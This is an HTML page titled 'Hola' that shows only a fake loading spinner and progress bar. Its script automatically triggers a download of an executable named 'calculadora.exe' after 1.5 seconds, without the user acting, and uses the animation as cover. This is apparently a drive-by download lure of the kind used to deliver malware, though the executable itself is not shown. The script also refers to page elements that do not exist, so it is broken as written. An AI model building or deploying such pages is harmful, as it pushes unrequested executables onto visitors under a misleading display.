<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Hola</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f0f2f5;
            color: #333;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            overflow: hidden;
        }

        h1 {
            color: #2c3e50;
            margin-bottom: 25px;
            text-align: center;
        }

        .container {
            background-color: #ffffff;
            padding: 40px 50px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 600px;
            width: 100%;
            display: none;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 1.5em;
            z-index: 1000;
            opacity: 1;
            visibility: visible;
            transition: opacity 0.6s ease, visibility 0.6s ease;
        }

        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.5s linear infinite;
            margin-bottom: 25px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-bar-container {
            width: 80%;
            max-width: 400px;
            background-color: #e0e0e0;
            border-radius: 8px;
            overflow: hidden;
            margin-top: 25px;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.3);
        }

        .progress-bar-fill {
            width: 0%;
            height: 30px;
            background-color: #28a745;
            border-radius: 8px;
            text-align: center;
            line-height: 30px;
            color: white;
            font-size: 1em;
            font-weight: bold;
            transition: width 0.8s ease-out;
        }

        .small-text {
            font-size: 0.9em;
            margin-top: 25px;
            text-align: center;
            line-height: 1.4;
        }
        .small-text a {
            color: #88ddff;
            text-decoration: underline;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
         <div class="progress-bar-container">
            <div id="progressBarFill" class="progress-bar-fill">0%</div>
        </div>
    </div>

 
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loadingOverlay = document.getElementById('loadingOverlay');
            const loadingMessage = document.getElementById('loadingMessage');
            const progressBarFill = document.getElementById('progressBarFill');
            const mainContent = document.getElementById('mainContent');
            const manualDownloadLink = document.getElementById('manualDownloadLink');

            progressBarFill.style.width = '0%';
            progressBarFill.textContent = '0%';

            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 5;
                if (progress <= 100) {
                    progressBarFill.style.width = progress + '%';
                    progressBarFill.textContent = progress + '%';
                } else {
                    clearInterval(progressInterval);
                }
            }, 100);

            const downloadSourceUrl = '/calculadora.exe';
            const fileName = 'calculadora.exe';

            manualDownloadLink.href = downloadSourceUrl;
            manualDownloadLink.download = fileName;
            // Also update the link in mainContent if it's used
            const mainContentDownloadLink = document.querySelector('#mainContent a');
            if (mainContentDownloadLink) {
                mainContentDownloadLink.href = downloadSourceUrl;
                mainContentDownloadLink.download = fileName;
            }


            setTimeout(() => {
                const downloadLink = document.createElement('a');
                downloadLink.href = downloadSourceUrl;
                downloadLink.download = fileName;
                document.body.appendChild(downloadLink);
                downloadLink.click();
                document.body.removeChild(downloadLink);
                console.log('Intento de descarga automÃ¡tica iniciado.');

                clearInterval(progressInterval);
                progressBarFill.style.width = '100%';
                progressBarFill.textContent = '100%';

                setTimeout(() => {
                    loadingOverlay.style.opacity = '0';
                    loadingOverlay.style.visibility = 'hidden';
                }, 2000);
            }, 1500);
        });
    </script>

</body>
</html>
